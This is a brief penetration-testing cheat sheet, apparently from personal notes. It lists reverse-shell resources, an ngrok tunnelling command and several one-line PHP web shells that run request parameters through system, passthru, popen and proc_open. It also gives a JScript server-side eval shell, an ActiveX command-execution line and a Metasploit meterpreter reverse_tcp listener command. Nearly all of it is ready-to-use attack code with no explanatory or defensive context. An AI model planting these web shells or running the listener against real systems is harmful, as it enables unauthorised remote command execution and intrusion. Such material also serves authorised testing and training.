- - -
###### Useful Links : 
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- https://alamot.github.io/reverse_shells/
<br>

##### Listen for Public conections and tunnel it to local.
```sh
ngrok tcp 9090
```

###### PHP Web Shells : 

```php
<?php echo system($_REQUEST['cmd']); ?>
```

```php
<?php  
	system($_REQUEST['cmd']);  
?>
```

```php
<?php  
    echo system($_GET["cmd"]);  
?>
```

```php
<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1');} ?>
```

```php
<?php proc_open($_GET['cmd'], array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')), $pipes); ?>

<?php popen($_GET['cmd'], 'r'); ?>

<?php echo $_GET['cmd']; ?> 

<?php passthru($_GET['cmd']); ?>
```

```js

// Server-side
<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["cmd"],"unsafe");}</script>



// Client-side
Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())

```
<br>

**Check you kali** : `/usr/share/webshell/`

###### Fast Listner ( Multi/handler ) : ⛈️ ⛈️ 
```sh
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.8.0.239; set LPORT 9090; set ExitOnSession false; exploit -j -z'
```

- - -

